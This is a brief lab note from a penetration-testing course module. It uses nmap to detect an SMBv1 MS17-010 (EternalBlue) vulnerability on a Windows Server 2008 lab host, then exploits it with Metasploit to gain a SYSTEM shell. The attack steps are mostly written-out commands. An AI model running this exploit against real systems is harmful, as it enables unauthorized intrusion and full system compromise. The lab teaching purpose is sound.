Penetration Test - Privilege Escalation
===

🔙 [MENU README](../README.md)


# iLab
Module 6 
```
Parrot Security       192.168.0.18    172.19.19.18
Windows Server 2019   192.168.0.20
Windows Server 2008   192.168.0.7, 21
SSH Server            192.168.0.70
WordPress             192.168.0.24
```

---

# MS17-010
Detect and Scan
```bash

nmap 192.168.0.7 -sVC -n -Pn
# 發現port 445

nmap 192.168.0.7 -sVC -n -Pn -p445 --script smb-protocols.nse
# 對 port 445深度探測，發現版本smb v1
# SMBv1 有 MS17_010 漏洞

nmap 192.168.0.7 -sVC -n -Pn -p445 --script smb-vuln-ms17-010.nse
# 針對 MS17_010 漏洞 進行探測


# Nmap中的Script : ls /usr/share/nmap/scripts/
```
Metasploit
```bash
msfconsole -q # without banner

# set paylaod
msf > search ms17_010
msf > use 2
msf > show options
msf > set rhosts 192.168.0.7
msf > check
msf > exploit  # Attack Success when see "WIN"


# WIN
getuid  # Server username: NT AUTHORITY\SYSTEM
shell
whoami
```


